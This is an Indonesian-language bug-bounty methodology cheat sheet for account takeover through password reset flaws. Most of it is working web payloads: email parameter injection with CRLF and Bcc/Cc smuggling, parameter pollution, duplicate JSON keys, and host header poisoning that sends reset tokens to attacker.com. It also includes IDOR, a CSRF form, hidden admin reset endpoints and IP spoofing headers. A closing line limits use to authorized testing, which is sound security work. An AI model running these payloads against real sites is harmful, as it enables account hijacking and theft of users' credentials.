
Metodologi Testing Account Takeover via Password Reset

🔑 Manipulasi Parameter Email
Uji apakah endpoint reset menerima banyak input email atau separator khusus.

```http
POST /api/v1/auth/password-reset HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "email": [
    "victim@gmail.com",
    "tester@gmail.com"
  ]
}
```

Variasi Form:
- email=victim@gmail.com,tester@gmail.com
- email=victim@gmail.com|tester@gmail.com
- email=victim@gmail.com%0atester@gmail.com
- email=victim@gmail.com%0d%0atester@gmail.com
- email=victim@gmail.com%0aBcc:tester@gmail.com
- email=victim@gmail.com%0d%0aCc:tester@gmail.com

🎯 Tujuan: paksa token reset terkirim ke inbox attacker.

---

🌀 Parameter Pollution
Kirim parameter duplikat dan lihat mana yang diprioritaskan backend.

```http
POST /forgot-password HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

email=victim@gmail.com&email=tester@gmail.com
```

Variasi:
- email=tester@gmail.com&email=victim@gmail.com
- email=victim@gmail.com&email=tester@gmail.com&email[]=tester@gmail.com

---

📦 JSON Injection
API sering salah parsing key duplikat atau nested.

```json
{
  "email": "victim@gmail.com",
  "email": "tester@gmail.com"
}
```

Nested:
```json
{
  "email": "victim@gmail.com",
  "user": {
    "email": "tester@gmail.com"
  }
}
```

Alternatif field:
```json
{
  "email": "victim@gmail.com",
  "backup_email": "tester@gmail.com"
}
```

---

🌐 Host Header Poisoning
Aplikasi kadang bikin URL reset dari header request.

```http
POST /api/auth/reset HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
X-Forwarded-Proto: https
Forwarded: host=attacker.com
Origin: https://attacker.com
Referer: https://attacker.com
Content-Type: application/json

{"email": "victim@gmail.com"}
```

Contoh hasil:
```
https://attacker.com/reset?token=XXXX
```

---

🔄 Reset Token Dipakai Ulang
Alur:
1. Request reset password  
2. Ganti password  
3. Coba pakai token yang sama lagi  

⚠️ Kalau token reusable → takeover permanen.

---

🛂 IDOR di Endpoint Reset
```json
{
  "user_id": 123,
  "token": "ATTACKERTOKEN",
  "password": "P@ss1234"
}
```

Ubah user_id ke akun lain → cek apakah diterima.

---

⚡ Race Condition
Spam request reset bersamaan → token ketuker/state rusak.  
Tool: Burp Turbo Intruder.

---

🪪 Manipulasi Referrer
```http
Referer: /reset?email=victim@gmail.com
```

---

✉️ Bypass Kanonisasi Email
Edge case:
- victim@gmail.com  
- victim+test@gmail.com  
- victim.test@gmail.com  
- victimgooglemail.com  

Unicode homograph:
```
victimvictіm24@gmail.com
```

---

🕸️ CSRF Password Reset
```html
<form action="https://target.com/reset-password" method="POST">
  <input name="password" value="hacked123">
</form>
```

---

🔍 Endpoint Reset Tersembunyi
- /api/reset-password  
- /api/v2/reset  
- /internal/reset  
- /admin/reset  
- /graphql  

Contoh:
```http
POST /api/su/resetPwd
username=admin
```
---

🚦 Bypass Rate Limit
Spam request reset → cek throttling.

---

🕵️ Spoofing Header
```http
X-Forwarded-For: 1.1.1.1
X-Real-IP: 1.1.1.1
X-Originating-IP: 1.1.1.1
Client-IP: 1.1.1.1
True-Client-IP: 1.1.1.1
```

---

⚠️ Catatan Penting:  
Metodologi ini hanya untuk testing di program bug bounty yang kamu punya izin, atau di aplikasi milik sendiri. Testing tanpa izin = ilegal.

```
